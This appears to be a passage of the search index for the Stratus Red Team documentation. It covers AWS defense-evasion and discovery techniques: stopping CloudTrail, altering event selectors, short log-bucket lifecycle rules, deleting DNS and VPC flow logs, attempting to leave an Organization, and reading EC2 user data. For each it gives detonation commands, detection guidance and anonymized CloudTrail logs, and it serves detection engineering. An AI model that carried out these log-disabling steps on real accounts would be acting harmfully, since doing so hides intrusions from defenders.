https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/cloudtrail_guardduty_bypass</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail.</li> </ul> <p>Detonation: </p> <ul> <li>Create a CloudTrail event selector to disable management events, through cloudtrail:PutEventSelectors</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-event-selectors\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#detection","title":"Detection","text":"<p>Identify when event selectors of a CloudTrail trail are updated, through CloudTrail's <code>PutEventSelectors</code> event.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>cloudtrail:PutEventSelectors</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"cn-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c2a89408-340a-42f0-8ace-75d9f5769393\",\n      \"eventName\": \"PutEventSelectors\",\n      \"eventSource\": \"cloudtrail.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:50:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"958312252124\",\n      \"requestID\": \"5176273c-0497-47e9-8f4c-840b62e7fc9a\",\n      \"requestParameters\": {\n         \"eventSelectors\": [\n            {\n               \"dataResources\": [\n                  {\n                     \"type\": \"AWS::S3::Object\",\n                     \"values\": []\n                  },\n                  {\n                     \"type\": \"AWS::Lambda::Function\",\n                     \"values\": []\n                  }\n               ],\n               \"excludeManagementEventSources\": [],\n               \"includeManagementEvents\": false,\n               \"readWriteType\": \"ReadOnly\"\n            }\n         ],\n         \"trailName\": \"stratus-red-team-ctes-trail-khlvciwdor\"\n      },\n      \"responseElements\": {\n         \"eventSelectors\": [\n            {\n               \"dataResources\": [\n                  {\n                     \"type\": \"AWS::S3::Object\",\n                     \"values\": []\n                  },\n                  {\n                     \"type\": \"AWS::Lambda::Function\",\n                     \"values\": []\n                  }\n               ],\n               \"excludeManagementEventSources\": [],\n               \"includeManagementEvents\": false,\n               \"readWriteType\": \"ReadOnly\"\n            }\n         ],\n         \"trailARN\": \"arn:aws:cloudtrail:cn-northsouth-2r:958312252124:trail/stratus-red-team-ctes-trail-khlvciwdor\"\n      },\n      \"sourceIPAddress\": \"221.254.191.250\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"cloudtrail.cn-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_ce507fbd-078a-4e4c-975d-d80cb80df469\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA2I0BSXU5LNRWIN0K\",\n         \"accountId\": \"958312252124\",\n         \"arn\": \"arn:aws:iam::958312252124:user/christophe\",\n         \"principalId\": \"AIDA3JXGLTFY4HTLVVO7\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/","title":"CloudTrail Logs Impairment Through S3 Lifecycle Rule","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Defense Evasion</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Impair Defenses: Disable Cloud Logs (T1562.008)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#description","title":"Description","text":"<p>Set a 1-day retention policy on the S3 bucket used by a CloudTrail Trail, using a S3 Lifecycle Rule.</p> <p>References: https://www.justice.gov/usao-sdny/press-release/file/1452706/download</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail logging to a S3 bucket.</li> </ul> <p>Detonation: </p> <ul> <li>Apply a S3 Lifecycle Rule automatically removing objects after 1 day.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#detection","title":"Detection","text":"<p>Identify when lifecycle rule with a short expiration is applied to an S3 bucket used for CloudTrail logging.</p> <p>The CloudTrail event <code>PutBucketLifecycle</code> and its attribute  <code>requestParameters.LifecycleConfiguration.Rule.Expiration.Days</code> can be used.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/","title":"Stop CloudTrail Trail","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Defense Evasion</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Impair Defenses: Disable Cloud Logs (T1562.008)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#description","title":"Description","text":"<p>Stops a CloudTrail Trail from logging. Simulates an attacker disrupting CloudTrail logging.</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail Trail.</li> </ul> <p>Detonation: </p> <ul> <li>Call cloudtrail:StopLogging to stop CloudTrail logging.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#detection","title":"Detection","text":"<p>Identify when a CloudTrail trail is disabled, through CloudTrail's <code>StopLogging</code> event.</p> <p>GuardDuty also provides a dedicated finding type, Stealth:IAMUser/CloudTrailLoggingDisabled.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>cloudtrail:StopLogging</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"apiso-centralnorth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"10163ed2-2253-469d-a5ee-cbc6651f8934\",\n      \"eventName\": \"StopLogging\",\n      \"eventSource\": \"cloudtrail.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T13:06:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"143434273843\",\n      \"requestID\": \"14c891b6-11b5-4787-ae97-64a974977078\",\n      \"requestParameters\": {\n         \"name\": \"stratus-red-team-ct-stop-trail-buykxbqejv\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"86.245.153.234\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"cloudtrail.apiso-centralnorth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c97089f1-1ae3-4ecc-b006-f5e8fd0f2571\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAGGWFBBHBE7D3M9WI\",\n         \"accountId\": \"143434273843\",\n         \"arn\": \"arn:aws:iam::143434273843:user/christophe\",\n         \"principalId\": \"AIDAOC1SYDVN0AF0FMMR\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/","title":"Delete DNS query logs","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Defense Evasion</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#description","title":"Description","text":"<p>Deletes a Route53 DNS Resolver query logging configuration. Simulates an attacker disrupting DNS logging.</p> <p>Warm-up:</p> <ul> <li>Create a DNS logging configuration.</li> </ul> <p>Detonation:</p> <ul> <li>Delete the DNS logging configuration using <code>route53:DeleteResolverQueryLogConfig</code>.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.dns-delete-logs\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#detection","title":"Detection","text":"<p>Identify when a DNS logging configuration is deleted, through CloudTrail's <code>DeleteResolverQueryLogConfig</code> event.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>route53resolver:DeleteResolverQueryLogConfig</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"sa-central-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ba4609ca-b420-4cb6-bdff-307729b3b7db\",\n      \"eventName\": \"DeleteResolverQueryLogConfig\",\n      \"eventSource\": \"route53resolver.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T14:23:46Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"206821776919\",\n      \"requestID\": \"6dbefe3c-b575-499a-a94d-a3bda0e4009a\",\n      \"requestParameters\": {\n         \"originSequenceNumber\": 0,\n         \"resolverQueryLogConfigId\": \"rqlc-4473f20ca554c07\"\n      },\n      \"responseElements\": {\n         \"resolverQueryLogConfig\": {\n            \"arn\": \"arn:aws:route53resolver:sa-central-3r:206821776919:resolver-query-log-config/rqlc-4473f20ca554c07\",\n            \"associationCount\": 0,\n            \"creationTime\": \"2024-07-31T14:23:44.841442289Z\",\n            \"creatorRequestId\": \"tf-r53-resolver-query-log-config-20240731142344425800000001\",\n            \"destinationArn\": \"arn:aws:s3:::stratus-red-team-dns-delete-bucket-bxxclslsdp\",\n            \"id\": \"rqlc-4473f20ca554c07\",\n            \"name\": \"stratus-red-team-dns-delete-config-bxxclslsdp\",\n            \"ownerId\": \"206821776919\",\n            \"shareStatus\": \"NOT_SHARED\",\n            \"status\": \"DELETING\"\n         }\n      },\n      \"sourceIPAddress\": \"251.234.045.249\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"route53resolver.sa-central-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_bdd216cd-7fb9-4b18-971a-cb585947fd95\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIADT99GZBZR7NVDT0D\",\n         \"accountId\": \"206821776919\",\n         \"arn\": \"arn:aws:iam::206821776919:user/christophe\",\n         \"principalId\": \"AIDAKUK081EB3L71EAZV\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/","title":"Attempt to Leave the AWS Organization","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Defense Evasion</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Modify Cloud Resource Hierarchy: Leave AWS Organization (T1666.A002)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#description","title":"Description","text":"<p>Attempts to leave the AWS Organization (unsuccessfully - will hit an AccessDenied error).  Security configurations are often defined at the organization level (GuardDuty, SecurityHub, CloudTrail...).  Leaving the organization can disrupt or totally shut down these controls.</p> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run organizations:LeaveOrganization</li> </ul> <p>Detonation: </p> <ul> <li>Call organization:LeaveOrganization to simulate an attempt to leave the AWS Organization.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.organizations-leave\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#detection","title":"Detection","text":"<p>Any attempts from a child account to leave its AWS Organization should be considered suspicious. </p> <p>Use the CloudTrail event <code>LeaveOrganization</code>.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>organizations:LeaveOrganization</code></p> </li> <li> <p><code>sts:AssumeRole</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"euiso-south-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"099bfd30-232c-4dff-9998-3821921063ca\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:30:00Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"307578594326\",\n      \"requestID\": \"4ddeba69-b9da-48b8-833a-c4d75f10111e\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::307578594326:role/stratus-red-team-leave-org-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722587398902687000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::307578594326:role/stratus-red-team-leave-org-role\",\n            \"accountId\": \"307578594326\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::307578594326:assumed-role/stratus-red-team-leave-org-role/aws-go-sdk-1722587398902687000\",\n            \"assumedRoleId\": \"AROAHKPEEQ9BHUOX4D93T:aws-go-sdk-1722587398902687000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIA36EV31F1RB3OA8IG\",\n            \"expiration\": \"Aug 2, 2024, 8:45:00 AM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEKH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDpLWjFwlZiDhOSv0Wy5mFb/hiIvKvEuUFZxT+drWNuGQIhAN4f3+HUyrPT31KHNwCaurNZJk5wXAWdp3sNeX03lBnkKrQCCIr//////////wEQARoMNzUxMzUzMDQxMzEwIgw0GyjMjlRuPkefn0kqiALzs49PG+DYSQ2tdUjlPv3YOOCAHkwaO7GpRcy9Yjo7R5RHGBw7NQSJmTGSahF/InmScEUvU8BV+ZuCsQJew5QC7yNqD4FNV5gCdj/0r0w/rh+GITYgoUvv47Xz4cGIhKfk0lsQiYptWeWq2htiubjbemAz2YXxoZUCHkGQUm1taei/jRfdMANUc63J20JxrhURAh2p3A/Aw9syW/eGT1AtV5Va4BpKkA/ik5mya7eEuyMxuXgldHBIXV04+7OcnJbkqJE+RMrP29VY5Z01ajs3NXTEFKpawctP8LXUIkfQDA35gSloJkeWlY4NUuN9rigCMjwRg1WpMWeQy/LwSm/BUm8mSh+dPYwwiLKytQY6nAFRnnDovTfsWAjH7oSq4aJzURd0sd5LeU0vbOMPSVXao0aCCZsF3kYLiZoy1vpfukI/z+FmduLMW1RpKR2S0iC0LUUrRekErl46GBRqnuc6T05CFZx9sFr0rUnTQlCJQFznQP2WLiQWs1uBL6vxrOi8bTuq4kTgOFJfGRIar0CXOOO19fPf5TDZ1HKRFo55VcamguEk4L4DCAJLivM=\"\n         }\n      },\n      \"sourceIPAddress\": \"252.5.222.230\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.euiso-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_fd969928-3c0d-4feb-bd56-34f9aee3e6eb\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIADVISM0T50G52IF0D\",\n         \"accountId\": \"307578594326\",\n         \"arn\": \"arn:aws:iam::307578594326:user/christophe\",\n         \"principalId\": \"AIDA7YYMW5FLWE3HGTNZ\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"euiso-south-3r\",\n      \"errorCode\": \"AccessDenied\",\n      \"errorMessage\": \"User: arn:aws:sts::307578594326:assumed-role/stratus-red-team-leave-org-role/aws-go-sdk-1722587398902687000 is not authorized to perform: organizations:LeaveOrganization on resource: * because no identity-based policy allows the organizations:LeaveOrganization action\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"16903cbd-fdff-4818-82f2-d66ad09aaf57\",\n      \"eventName\": \"LeaveOrganization\",\n      \"eventSource\": \"organizations.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:30:00Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"307578594326\",\n      \"requestID\": \"47bd7f8f-1cbf-49df-8503-7d60917e721a\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"252.5.222.230\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"organizations.euiso-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_fd969928-3c0d-4feb-bd56-34f9aee3e6eb\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA36EV31F1RB3OA8IG\",\n         \"accountId\": \"307578594326\",\n         \"arn\": \"arn:aws:sts::307578594326:assumed-role/stratus-red-team-leave-org-role/aws-go-sdk-1722587398902687000\",\n         \"principalId\": \"AROAHKPEEQ9BHUOX4D93T:aws-go-sdk-1722587398902687000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-08-02T08:30:00Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"307578594326\",\n               \"arn\": \"arn:aws:iam::307578594326:role/stratus-red-team-leave-org-role\",\n               \"principalId\": \"AROAHKPEEQ9BHUOX4D93T\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-leave-org-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"euiso-south-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e3441619-0bf6-4818-bf18-391fb65ba98e\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:29:59Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"307578594326\",\n      \"requestID\": \"0af9d3b8-6911-407f-a3e7-b54c4e36e41c\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::307578594326:role/stratus-red-team-leave-org-role\",\n         \"roleSessionName\": \"aws-go-sdk-1722587398902687000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::307578594326:role/stratus-red-team-leave-org-role\",\n            \"accountId\": \"307578594326\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::307578594326:assumed-role/stratus-red-team-leave-org-role/aws-go-sdk-1722587398902687000\",\n            \"assumedRoleId\": \"AROAHKPEEQ9BHUOX4D93T:aws-go-sdk-1722587398902687000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIAMOWPWQJ1QHWCWJXJ\",\n            \"expiration\": \"Aug 2, 2024, 8:44:59 AM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEKH//////////wEaCXVzLWVhc3QtMSJHMEUCIEn2jTjXoiKEo1nDM8a/bLpChCnNR5DiuhZ/X7Nb+LPgAiEAnbcwRa2KudpyvlCk/Rp1BejOkEXlpQzJoLaMyfhQpq0qtAIIiv//////////ARABGgw3NTEzNTMwNDEzMTAiDER+6/kn5hAd98DsoCqIAmEmhie9s2iLhj9Nf3lGI2Ezprwy/Zk/HQRQPKuxJu6+0ZyRwAlgZeXcOTfjo3xTdiVRTNiu9SUOAFNsMoiIvVFOofY0XojtNMVKA1PVNjcDqpidgdJZGeFMnGXSEb5ea4ZLUCY6sOm4SgsL2vuPOz5i+Bz40ajwu5bAfNnrXFnPHqwLQnf0PSCZQmbESeo0KjQ7TQ0Vw3mjWP2aW0EJFw789hyQthYLkQPoZrqw9n3FCnX7IidusIVIAjOVh4Da3aw8nWhiwOEizs9UX0ZIq+wmeWx6B4MuzMCp9BNNRGqxhO4Mje2K+Z3qd1+6RC/AdydJwHuoNi0oAY0t1yFb4DyzQyD9Gi3qXzCHsrK1BjqdAU23Sc9g9h/uJPJIB81GJ2hEqAToB/tYMJSINsK9vbSLa3ugqzTo9AD3Y95d3jVv7VB1bKIX2FMhcTqKpKZKtmriqAZJ3UNgNA9ZMf31H35M87SXbVN0z2a9H8XZO4iQrdNQzKBR8rlGOb6i+UefrltFQLdRbwKbfiWsiZwkEyz5RK7794ELHV+3328jn+GUiJYTv731tRSkrc7wfvE=\"\n         }\n      },\n      \"sourceIPAddress\": \"252.5.222.230\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.euiso-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_fd969928-3c0d-4feb-bd56-34f9aee3e6eb\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIADVISM0T50G52IF0D\",\n         \"accountId\": \"307578594326\",\n         \"arn\": \"arn:aws:iam::307578594326:user/christophe\",\n         \"principalId\": \"AIDA7YYMW5FLWE3HGTNZ\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/","title":"Remove VPC Flow Logs","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Defense Evasion</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#description","title":"Description","text":"<p>Removes a VPC Flog Logs configuration from a VPC.</p> <p>Warm-up: </p> <ul> <li>Create a VPC with a VPC Flow Logs configuration.</li> </ul> <p>Detonation: </p> <ul> <li>Remove the VPC Flow Logs configuration.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.vpc-remove-flow-logs\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#detection","title":"Detection","text":"<p>Using CloudTrail's <code>DeleteFlowLogs</code> event.</p> <p>To reduce the risk of false positives related to VPC deletion in development environments, alerts can be raised only when <code>DeleteFlowLogs</code> is not closely followed by <code>DeleteVpc</code>.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>ec2:DeleteFlowLogs</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"megov-south-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ded2f5af-f3a5-46d2-a170-a23206a32c36\",\n      \"eventName\": \"DeleteFlowLogs\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T15:07:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"498376118699\",\n      \"requestID\": \"96d51d7f-c18d-45b9-8315-9aa0fde21e88\",\n      \"requestParameters\": {\n         \"DeleteFlowLogsRequest\": {\n            \"FlowLogId\": {\n               \"content\": \"fl-0e17aa62a21d4bbfe\",\n               \"tag\": 1\n            }\n         }\n      },\n      \"responseElements\": {\n         \"DeleteFlowLogsResponse\": {\n            \"requestId\": \"96d51d7f-c18d-45b9-8315-9aa0fde21e88\",\n            \"unsuccessful\": \"\",\n            \"xmlns\": \"http://ec2.amazonaws.com/doc/2016-11-15/\"\n         }\n      },\n      \"sourceIPAddress\": \"206.90.1.223\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.megov-south-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5d25952b-37cb-46cc-a135-3407cbbca7bf\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA5Q8Z0GHOBYSEN9D6\",\n         \"accountId\": \"498376118699\",\n         \"arn\": \"arn:aws:iam::498376118699:user/christophe\",\n         \"principalId\": \"AIDACKW2I5F25HSI3O4J\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/","title":"Download EC2 Instance User Data","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Discovery</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#description","title":"Description","text":"<p>Runs ec2:DescribeInstanceAttribute on several instances. This simulates an attacker attempting to retrieve Instance User Data that may include installation scripts and hard-coded secrets for deployment.</p> <p>See: </p> <ul> <li>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</li> <li>https://hackingthe.cloud/aws/general-knowledge/introduction_user_data/</li> <li>https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/ec2__download_userdata/main.py</li> </ul> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run ec2:DescribeInstanceAttribute</li> </ul> <p>Detonation: </p> <ul> <li>Run ec2:DescribeInstanceAttribute on multiple fictitious instance IDs</li> <li>These calls will result in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ec2-download-user-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>DescribeInstanceAttribute</code> event.</p> <p>See:</p> <ul> <li>Associated Sigma rule</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2:DescribeInstanceAttribute</code></p> </li> <li> <p><code>sts:AssumeRole</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::751353041310:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:751353041310:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: 